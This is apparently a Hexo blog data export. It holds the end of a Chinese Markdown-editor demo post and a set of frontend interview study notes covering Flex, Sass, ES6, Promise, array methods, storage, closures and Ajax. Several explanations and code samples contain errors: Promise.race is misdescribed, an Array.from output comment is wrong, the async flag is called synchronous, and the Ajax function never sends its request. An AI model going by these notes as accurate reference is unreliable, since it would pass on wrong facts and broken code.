href=\"#注释也是必不可少的\" class=\"headerlink\" title=\"注释也是必不可少的\"></a>注释也是必不可少的</h2><p>Markdown将文本转换为 HTML。</p>\n<p>*[HTML]:   超文本标记语言</p>\n<h2 id=\"KaTeX数学公式\"><a href=\"#KaTeX数学公式\" class=\"headerlink\" title=\"KaTeX数学公式\"></a>KaTeX数学公式</h2><p>您可以使用渲染LaTeX数学表达式 <a href=\"https://khan.github.io/KaTeX/\">KaTeX</a>:</p>\n<p>Gamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\forall<br>n\\in\\mathbb N$ 是通过欧拉积分</p>\n<p>$$<br>\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt,.<br>$$</p>\n<blockquote>\n<p>你可以找到更多关于的信息 <strong>LaTeX</strong> 数学表达式<a href=\"http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\">here</a>.</p>\n</blockquote>\n<h2 id=\"新的甘特图功能，丰富你的文章\"><a href=\"#新的甘特图功能，丰富你的文章\" class=\"headerlink\" title=\"新的甘特图功能，丰富你的文章\"></a>新的甘特图功能，丰富你的文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mermaid\">gantt<br>        dateFormat  YYYY-MM-DD<br>        title Adding GANTT diagram functionality to mermaid<br>        section 现有任务<br>        已完成               :done,    des1, 2014-01-06,2014-01-08<br>        进行中               :active,  des2, 2014-01-09, 3d<br>        计划一               :         des3, after des2, 5d<br>        计划二               :         des4, after des3, 5d<br></code></pre></td></tr></table></figure>\n<ul>\n<li>关于 <strong>甘特图</strong> 语法，参考 <a href=\"https://mermaidjs.github.io/\">这儿</a>,</li>\n</ul>\n<h2 id=\"UML-图表\"><a href=\"#UML-图表\" class=\"headerlink\" title=\"UML 图表\"></a>UML 图表</h2><p>可以使用UML图表进行渲染。 <a href=\"https://mermaidjs.github.io/\">Mermaid</a>. 例如下面产生的一个序列图：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mermaid\">sequenceDiagram<br>张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?<br>李四--&gt;&gt;王五: 你最近怎么样，王五？<br>李四--x 张三: 我很好，谢谢!<br>李四-x 王五: 我很好，谢谢!<br>Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.<br><br>李四--&gt;&gt;张三: 打量着王五...<br>张三-&gt;&gt;王五: 很好... 王五, 你怎么样?<br></code></pre></td></tr></table></figure>\n\n<p>这将产生一个流程图。:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mermaid\">graph LR<br>A[长方形] -- 链接 --&gt; B((圆))<br>A --&gt; C(圆角长方形)<br>B --&gt; D&#123;菱形&#125;<br>C --&gt; D<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>关于 <strong>Mermaid</strong> 语法，参考 <a href=\"https://mermaidjs.github.io/\">这儿</a>,</li>\n</ul>\n<h2 id=\"FLowchart流程图\"><a href=\"#FLowchart流程图\" class=\"headerlink\" title=\"FLowchart流程图\"></a>FLowchart流程图</h2><p>我们依旧会支持flowchart的流程图：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mermaid\">flowchat<br>st=&gt;start: 开始<br>e=&gt;end: 结束<br>op=&gt;operation: 我的操作<br>cond=&gt;condition: 确认？<br><br>st-&gt;op-&gt;cond<br>cond(yes)-&gt;e<br>cond(no)-&gt;op<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>关于 <strong>Flowchart流程图</strong> 语法，参考 <a href=\"http://adrai.github.io/flowchart.js/\">这儿</a>.</li>\n</ul>\n<h2 id=\"导出与导入\"><a href=\"#导出与导入\" class=\"headerlink\" title=\"导出与导入\"></a>导出与导入</h2><h3 id=\"导出\"><a href=\"#导出\" class=\"headerlink\" title=\"导出\"></a>导出</h3><p>如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 <strong>文章导出</strong> ，生成一个.md文件或者.html文件进行本地保存。</p>\n<h3 id=\"导入\"><a href=\"#导入\" class=\"headerlink\" title=\"导入\"></a>导入</h3><p>如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，<br>继续你的创作。</p>\n<section class=\"footnotes\"><div class=\"footnote-list\"><ol><li><span id=\"fn:1\" class=\"footnote-text\"><span><a href=\"https://mermaidjs.github.io/\">mermaid语法说明</a>\n<a href=\"#fnref:1\" rev=\"footnote\" class=\"footnote-backref\"> ↩</a></span></span></li><li><span id=\"fn:2\" class=\"footnote-text\"><span>注脚的解释\n<a href=\"#fnref:2\" rev=\"footnote\" class=\"footnote-backref\"> ↩</a></span></span></li></ol></div></section>"},{"title":"前端面筋","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg11.jpg","_content":"\n\n# 前端三大件\n\n## 一、HTML\n\n\n\n## 二、CSS\n\n### 1.Flex布局\n\n> Flex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；\n\n![](https://s3.bmp.ovh/imgs/2023/03/16/1d4271c9004b7a95.png)\n\n- flex-direction:主轴方向，row，row-reverse，column，column-recerse；\n- flex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）\n- flex-flow:前两者的缩写，默认row nowrap\n- justify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；\n- align-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；\n- align-content:定义多根轴线对齐方式，一行则不生效；\n- order属性：属于item，按照order大小排序；\n- flex-grow:定义item的放大比例；\n- flex-shrink:按照比例缩小；\n- flex: flex-grow,flex-shrink,flex-basis;\n- align-self:允许item自己的属性；可覆盖aligin-items;\n\n### 2.CSS预处理器\n\n> CSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;\n>\n> 通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；\n>\n> 如：语法不够强大，妹有变量和合理的样式复用机制等；\n\n\n\n##### CSS预处理器的作用\n\n- 提供css缺失的样式层复用机制，减少冗余代码；\n- 提高样式代码的可维护性；\n\n##### Sass（.scss）\n\n成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；\n\n功能：\n\n- 变量、常量\n\n```scss\n$bgColor:#fff;\t\t//以$开头，表示全局和局部变量\ndiv{\n    $width:100px;\t//局部变量\n    width:$width;\n    background:$bgColor;\n}\n\n//变量用在属性中，需要写在#{}中\n$posi:left;\ndiv{\n    border-#{$posi}:1 px solid $color;\n}\n\n//默认变量，值后面加上 ！default\n$myLineHeight:1.5 !default;\n\nbody{\n    line-height:$myLineHeight;\n}\n\nbody{\n    line-height:1.5;\n}\n```\n\n- CSS代码嵌套\n\n```scss\n//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；\n//选择器嵌套中，可以使用&表示父元素选择器；\n#top_btn{\n    line-height:40px;\n    text-transform:capitalize;\n    li{\n        float:left;\n    }\n    a{\n        display：block;\n        \n        &:hover{\n            color:#ddd;\n        }\n    }\n}\n\n//属性嵌套\n.main-container{\n    //选择器嵌套\n    &-top{\n        color:red;\n    }\n    //伪类嵌套\n    &:hover{\n        color:green'\n    }\n}\n```\n\n- 混入Mixin\n\n> Mixins是CSS预处理器最强大的特性；\n>\n> 可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；\n\n```scss\n//无参数mixin\n@mixin center-block{\n    margin-left:auto;\n    margin-right:auto;\n}\n.btn{\n    @include center-block;\n}\n\n```\n\n```scss\n//有参数mixin\n@mixin theme($theme:Darkgray){\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:#fff;\n}\n\n.infor{\n    @include theme;\n}\n\n.alert{\n    @include theme($theme:Darkred);\n}\n\n//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；\n@mixin theme($theme:Darkgray,$color:red){\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:$red;\n}\n```\n\n```scss\n//模块系统\n//test.scss\n$font-stack: Helvetica, sans-serif;\n$primary-color: #333;\n\nbody {\n  font: 100% $font-stack;\n  color: $primary-color;\n}\n\n//styles.scss\n// 使用@use导入文件\n@use 'test'; // 生成了一个 test 命名空间\n\n.inverse {\n  background-color: test.$primary-color;\n  color: white;\n}\n\n```\n\n- 继承\n\n```scss\n/* This CSS will print because %message-shared is extended. */\n%message-shared {\n  border: 1px solid #ccc;\n  padding: 10px;\n  color: #333;\n}\n\n// This CSS won't print because %equal-heights is never extended.\n%equal-heights {\n  display: flex;\n  flex-wrap: wrap;\n}\n\n.message {\n  @extend %message-shared;\n}\n\n.success {\n  @extend %message-shared;\n  border-color: green;\n}\n\n.error {\n  @extend %message-shared;\n  border-color: red;\n}\n\n.warning {\n  @extend %message-shared;\n  border-color: yellow;\n}\n\n```\n\n- 函数\n\n```scss\nx @use \"sass:math\";\n\n.container{\n    display:flex;\n}\n\narticle[role=\"main\"]{\n    width:math.div(600px,960px)*100%;\n}\n\naside[role=\"complementary\"]{\n    width:math.div(300px,960px)*100%;\n    margin-left:auto;\n}\n//支持加减乘除，循环等；\n```\n\n缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；\n\n- 需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）\n- 需要node-gyp作为先决条件->需要兼容版本的python；\n- binding.node源无法访问或者速度慢；\n\n##### Less\n\nLess是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；\n\n\n\n##### Stylus\n\nStylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；\n\n\n\n\n\n### 3.多屏适应，自适应布局和响应式布局区别\n\n\n\n\n\n### 4.过渡动画\n\n- transform（平移旋转缩放）\n\n```css\n.{\n    translate(50px,100px);\t\t\t/*平移，x y方向*/\n    rotate(20deg);\t\t\t\t\t/*旋转 顺时针旋转20°*/\n    rotateX(150deg);\t\t\t\t\t/*x轴旋转*/\n    scaleX(2);\t\t\t/*增大两倍宽度*/\n    scale(1,2);\t\t\t\t/*宽度一赔，高度两倍*/\n    \n}\n```\n\n\n\n- animation\n\n```css\n*animation-name：关键帧的名字，该参数必需。\n*animation-duration：动画持续的时间，该参数必需。\nanimation-timing-function：定时器函数，默认是ease。\nanimation-delay：动画效果多少秒后开始，默认为0。\nanimation-iteration-count：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。\nanimation-direction：动画方向，可能的值为forward、backward或alternating，默认值为normal。\nanimation-fill-mode：默认值为none。\nanimation-play-state：动画默认是否生效，默认值为running。\n\n```\n\n- `animation` 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个[关键帧](https://so.csdn.net/so/search?q=关键帧&spm=1001.2101.3001.7020)（`animation` 和 `@keyframes`结合使用）\n- `transition` 强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；\n\n### 5.标准盒模型和怪异盒模型\n\nW3C标准盒子模型由：content、margin、padding、border组成；\n\n##### 区别：总宽度的计算公式不一样\n\n标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201224112703410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center)\n\n怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201224113002950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center)\n\n```css\n    .box {\n        margin: 30px;\n        padding: 20px;\n        width: 80px;\n        height: 40px;\n        border: 10px solid #00007e;\n        background: #fec997;\n        box-sizing: border-box /* 设置盒子类型 */\n      }\n\n/*\n\tcontent-box:标准盒模型；\n\tborder-box:怪异盒模型；\n\tpadding-box:盒子宽度等于content+padding;\n\tinherit:从父元素继承box-sizeing的属性；\n*/\n\n```\n\n\n\n## 三、JS\n\n### 1.基本数据类型\n\n- 基本数据类型\n\n```\nnumber,string,undefined,Boolean,null;\nES6添加：Symbol\n```\n\n- 复杂数据类型\n\n```\nObject；\n```\n\n> 0.1+0.2！=0.3\n>\n> 浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004\n>\n> 基于IEEE754数值的浮点计算通病；\n\n### 2.ES6新特性\n\n> ES6=ES2015\n\n- 新增块级作用域let,const;\n\n```js\n//let \nfor(var i=0;i<5;i++){\n    console.log(i);\n}\n\nconsole.log(i+1);\t\t\t//循环体外部能够访问i，使用let不会\n\n//const声明的是常量，不能被修改；\nconst a=1;\n\n//const 声明的数组不可以被重新赋值，但是可以修改元素；\nconst names=[\"A\",\"B\"];\n\n```\n\n- 定义类的语法糖；\n- 新增基本数据类型Symbol；\n- 新增变量解构赋值；\n\n```js\n//数组\nlet arr=[1,2,3]\nconst [x,y,z]=arr;\n\n//对象\nconst person={\n    name:\"Martin\",\n    age:22,\n    languages:['Java','Python']\n};\n\nconst {name:n,age:a,language:l}=person;\nconsole.log(n,a,l);\n```\n\n\n\n- 函数参数允许默认值，引入rest参数，新增箭头函数；\n\nhttps://blog.csdn.net/sinat_41696687/article/details/121903414\n\n```js\n// =>不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；\n//如果箭头函数的外层有普通函数，this指向普通函数的this；\n//妹有普通函数，this指向全局变量\n//有\nlet obj = {\n  fn:function(){\n      console.log('我是普通函数',this === obj)   // true\n      return ()=>{\n          console.log('我是箭头函数',this === obj) // true\n      }\n  }\n}\nconsole.log(obj.fn()())\n\n//妹有\nlet obj = {\n    fn:()=>{\n        console.log(this === window);\n    }\n}\nconsole.log(obj.fn())\n// true\n\n//默认值\n\nfunction add(a,b=1){\n    return a+b;\n}\n\n//箭头函数是匿名函数，不能作为构造函数，不可以使用new；\n\n//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;\n```\n\n- 数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；\n\n```js\n//字符串拓展\nlet str = \"hello ReactJS\";\nconsole.log(str,\"中是否包含ReactJS\",str.includes(\"ReactJS\"));\nconsole.log(str,\"是否以h开头\",str.startsWith(\"h\"));\nconsole.log(str,\"是否以actJS结尾\",str.endsWith(\"actJS\"));\n\n//字符串模板\nlet str = `c\ny\nl`;\n```\n\n\n\n- 对象和数组新增拓展运算符号；\n- 新增模块化：import,export;\n\n```js\nvar name='Martin';\nexport {name};\n\nexport function MakeLove(){\n    \n}\n\n\n```\n\n\n\n- 新增Set()和Map数据结构；\n- 原生提供Proxy构造函数，用来生成Proxy实例；\n- 新增生成器**Generater**和**Iterator**；\n\n\n\n### 3.Bigint\n\n> 支持任意长度的整数：末尾+n；\n>\n> 不能混用常规的和Bigint\n\n### 4.Promise 和 Await\n\nhttps://es6.ruanyifeng.com/#docs/promise\n\n- Promise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；\n- 一个用来保存某个未来才会结束的事件；\n\n> Promise对象有以下两个特点：\n>\n> （1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：\n>\n> pending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；\n>\n> （2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending->fulfilled，pending->rejected\n>\n> 状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；\n>\n> 缺点：\n>\n> 无法取消Promise，一旦新建就会立即执行，无法中途取消；\n>\n> 不设置回调函数，Promise内部抛出的错误不会反映到外部；\n>\n> 当处于pending状态时，无法得知目前进展到哪一个阶段；\n\n```js\n//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject\n//resolve函数是将Promise对象的状态从未完成变成成功；pending->resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；\n//reject函数时将promise对象的状态从未完成变成失败，pending->rejected，异步操作错误时将报错错位参数传递出去；\npromise.then(function(valueA){\n    \n},function(error){\n    \n})\n\n```\n\n- promise.prototype.then(参数1，参数2)\n\n```js\n//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；\n//可以采用链式写法\ngetJSON(\"url\").then((res)=>{\n    \n}).then((error)=>{\n    \n})\n```\n\n- promise.prototype.catch()\n\n```js\n//是then的别名，用于指定发生错误时的回调函数\ngetJson().then((res)=>{\n    \n}).catch((error)=>{\n    console.log(error);\n})\n```\n\n- promise.prototype.finally()\n\n```js\ngetJson().then((res)=>{\n    \n}).catch((error)=>{\n    console.log(error);\n}).finally(()=>{\n    //最后一定执行\n})\n```\n\n- promise.all()\n\n```js\n//用于将多个promise实例，包装成一个新的promise实例\nconst p=Promise.all([p1,p2,p3]);\n\n//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；\nconst databasePromise = connectDatabase();\n\nconst booksPromise = databasePromise\n  .then(findAllBooks);\n\nconst userPromise = databasePromise\n  .then(getCurrentUser);\n\nPromise.all([\n  booksPromise,\n  userPromise\n])\n.then(([books, user]) => pickTopRecommendations(books, user));\n```\n\n- Promise.race():多个实例任一成功都会返回成功；\n\n### 5.数组方法\n\n##### join() （数组转字符串）\n\n```js\nvar arr = [1, 2, 3, 4]\nconsole.log(arr)\nconsole.log(arr.join(''))\nconsole.log(arr.join('-'))\nconsole.log(arr)\t//原数组不变\n\n//join实现重复字符串\nfunction repeateStr (str, n) {\n  return new Array(n + 1).join(str)\n}\n\n```\n\n##### push()和pop()\n\n```js\n//push 向数组的末尾添加元素\n//pop 删除并返回最后一个数组元素\n```\n\n##### shift()和unshift()\n\n```js\n// shift() 删除数组第一个元素，并返回该元素的值\n// unshift() 向数组的开头添加一个或多个元素，并返回新的长度\n```\n\n##### sort()\n\n```js\n\n// sort() 对数组元素进行排序，并返回当前数组:对字符的排序是按照字母的Unicode码进行排序的\n// reverse() 颠倒数组中元素的顺序，并返回当前数组\nvar arr = [1, 100, 20, 30]\nconsole.log(arr.sort())\nconsole.log(arr.reverse())\n//实现数值排序\nconsole.log(arr.sort(function (a, b) {\n  return a - b\n}))\n\n```\n\n##### concat()  (连接数组)\n\n```js\n// concat() 连接两个或多个数组，并返回新的数组\n// slice() 选取数组的的一部分，并返回一个新数组\n// splice() 从数组中添加或删除元素，并返回被删除的元素\nvar arr = [1, 2, 3, 4, 5]\nconsole.log(arr.concat([6, 7, 8]))\nconsole.log(arr.slice(1, 3))\nconsole.log(arr.splice(1, 2, 6, 7, 8))\n\n//传入二维数组，将其转化为一维数组\nvar arr1 = [[1, 2], [3, 4], [5, 6]]\nconsole.log(arr.concat(arr1))\t\t//讲数组当作元素项合并\nconsole.log([].concat.apply([], arr1))\t\t//合并\n```\n\n##### slice(start,end) \n\n·ES5新增·\n\n##### indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1\n\n##### forEach() map(),filter(),some(),every();\n\n```js\nvar arr = [1, 2, 3, 4, 5]\n\narr.forEach(function (item, index, arr) {\n  console.log(index, item)\n})\n\n//指“映射”，方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值\nvar arr1 = arr.map(function (item, index, arr) {\n  return item * 2\n})\nconsole.log(arr1)\n\n// “过滤”功能，方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。和filter() 方法类似，jquery中有个 grep()方法也用于数组元素过滤筛选。\nvar arr2 = arr.filter(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr2)\n\n//判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回true。\nvar arr3 = arr.every(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr3)\n\n//判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回true。\nvar arr4 = arr.some(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr4)\n```\n\n##### reduce(),reduceRight()\n\n```js\n//归并方法:迭代数组中的所有项，然后生成一个最终返回值。\n//第一个参数是每一项调用的函数，函数接受四个参数分别是初始值，当前值，索引值，和当前数组\n//函数需要返回一个值，这个值会在下一次迭代中作为初始值。第二个参数是迭代初始值，参数可选，\n//如果缺省，初始值为数组第一项，从数组第一个项开始叠加，缺省参数要比正常传值少一次运算。\n//reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nvar result = arr.reduce(function (prev, cur, index, arr) {\n  return prev + cur\n})\n\nconsole.log(result) // 55\n```\n\n·ES6新增方法·\n\n##### Array.from()\n\n```js\nlet json = {\n  //必须是数字\n  \"0\": \"zhangsan\",\n  \"1\": 18,\n  length: 2\t\t\t//需要长度\n}\n\nlet arr = Array.from(json)\nconsole.log(arr) // []\n```\n\n##### Array.of()\n\n\n\n### 6.离线应用和客户端存储\n\n- 离线检测\n\n> HTML5定义了一个navigator.online属性，如果为true表示设备能够上网；\n\n- 应用缓存\n\n> H5使用appcache专门为开发离线Web应用设计；\n>\n> 从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；\n\n- 数据存储\n\n  1. ​\tCookie\n\n  > Http Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；\n\n  > 限制：\n  >\n  > cookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；\n  >\n  > 构成:\n  >\n  > Cookie由名称，值，域，路径，失效时间，安全标志组成；\n\n  2. Web存储机制\n\n  - 提供一个cookie之外存储会话的途径；\n  - 提供一种存储大量跨会话的数据机制；\n\n  > storage类型\n  >\n  > 它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；\n  >\n  > 只能存储字符串；\n\n  > sessionStorage类型\n  >\n  > 它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。\n  >\n  > 存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；\n\n  ```js\n  //使用方法存储数据\n  sessionStorage.setItem(\"name\",\"Martin\");\n  //使用属性存储数据\n  sessionStorage.book=\"JS\";\n  ```\n\n  3. globalStorage类型\n\n  ```js\n  globalStorage['域名'].name=\"Martin\";\n  ```\n\n  4. localStorage类型\n\n> localStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；\n>\n> 与globalStorage不同；\n\n### 7.cookie设置，token如何实现登录\n\n\n\n### 8.闭包\n\n> 如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；\n\n```js\nvar a=1;\n\n//匿名立即执行函数，访问了全局变量a;\n(\n\tfunction test(){\n        console.log(a);\n    }\n)()\n```\n\n```js\n//常见的闭包形式：函数嵌套\n\nfunction a(){\n    var index=0;\n    index=index+1;\n    \n    function b(){\n        index=index+2;\n        console.log(index);\n    }\n    \n    return b;\n}\n\nvar c=a();\t\t\t//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；\nc();\t\t\t\t//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；\nc();\t\t\t\t//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；\n```\n\n##### 特点：\n\n- 被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；\n- 闭包函数u实现了对其他函数内部变量的访问；\n\n##### JS垃圾回收机制：\n\n- 如果一个对象不再被引用，这个对象会被GC回收；\n- 如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；\n\n##### 闭包的用途：\n\n- 访问函数内部的变量；\n- 让变量始终保持在内存中；\n\n##### 应用场景：\n\n- 模拟面向对象的代码风格\n\n```js\nfunction Person(name){\n    function Say(content){\n        console.log(name+\":\"+content);\n    }\n    \n    return Say;\n}\n\na=Person(\"martin\");\nb=Person(\"jacy\");\na(\"What are u doing ?\");\nb(\"Nothing\");\na(\"Hang out with me ?\");\nb(\"To there?\");\n```\n\n- 使用`setTimeout`支持传参(通过闭包实现setTimeout第一个函数传参)\n\n```js\nfunction func(param){\n    return function(){\n        console.log(param);\n    }\n}\n\nvar f1=func(1);\nsetTimeout(f1,1000);\n```\n\n- 封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数\n\n```js\nvar counter=(function(){\n    var privateCounter=0;   //私有变量\n\n    function change(val){\n        privateCounter+=val;\n    }\n\n    return {\n        increment:function(){\n            change(1);\n        },\n        decrement:function(){\n            change(-1);\n        },\n        value:function(){\n            return privateCounter;\n        }\n    };\n})();\n\nconsole.log(counter.value());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.value());\n```\n\n- 模拟块作用域\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/764a7d4d2f244f3dbb50fa59da6105eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyd6ZizMzk=,size_15,color_FFFFFF,t_70,g_se,x_16)\n\n> onclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；\n>\n> 也可使用let i=0;来解决；\n\n```js\nvar elements=document.getElementsByTagName('li');\nvar length=elements.length;\n\nfor(var i=0;i<length;i++){\n    elements[i].onclick=function(num){\n        return function(){\n            console.log(num);\n        }\n    }(i);           //通过匿名闭包，把每次的i保存到一个变量中实现了效果\n}\n```\n\n- 实现迭代器\n\n```js\nfunction setup(x){\n    var i=0;\n    return function(){\n        return x[i++];\n    };\n}\nvar next=setup([1,2,3]);\nconsole.log(next);\nconsole.log(next);\nconsole.log(next);\n```\n\n##### 闭包优点：\n\n- 减少全局变量的定义，避免全局变量污染；\n- 能够读取函数内部的变量；\n- 内存中维护一个变量，用作缓存；\n\n##### 闭包缺点：\n\n- 造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；\n\n解决方法：使用完毕以后设置为null；\n\n- 闭包可能在父函数外部，改变父函数内部的值；\n- 由于闭包设计跨作用域访问，会导致性能损失；\n\n解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；\n\n\n\n### 9.如何实现原生ajax？\n\n> Ajax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；\n\n- 创建XMLHttpRequest对象；\n\n> 老版本的浏览器用的ActiveX对象；\n>\n> 现代浏览器使用XMLHttpRequest对象；\n\n- 向服务器发送请求；\n\n```\nopen(method,url,async)\t\t//请求类型，url位置，true同步\nsend（string）\t\t\t//仅用于POST；\n```\n\n- 服务器响应；\n\n> 1.responseText   字符串形式的数据响应；\n>\n> 2.responseXML  XML形式的数据响应；\n\n- 判断是否成；\n\n> 1.onreadystatechange    存储函数，每当readystate属性改变时调用；\n>\n> 2.readyState  \t\t\t存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；\n>\n> 3.status\t\t\t200 ok   404 Page not found;\n\n```js\n//原生Ajax\nfunction oriAjax(url,){\n    //判断浏览器版本\n    if(window.XMLHttpRequest){\n        var ajaxRequest=new XMLHttpRequest();\n    }else{\n        var ajaxRequest=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n\n    ajaxRequest.open(\"GET\",url,true);\n\n    ajaxRequest.onreadystatechange=function(){\n        if(ajaxRequest.readyState==4 && ajaxRequest.status==200){\n            //更新dom结点\n            document.getElementById(\"myDiv\").innerHTML=ajaxRequest.responseText;\n        }else{\n            console.log(ajaxRequest.response);\n        }\n    }\n}\n```\n\n\n\n\n\n### 10.JS排序算法底层原理？\n\nsort（）数组长度小于22使用插入排序，大于22快排；\n\n\n\n### 11.nextTick\n\n# Git相关\n\nhttps://worktile.com/kb/ask/20275.html\n\n### 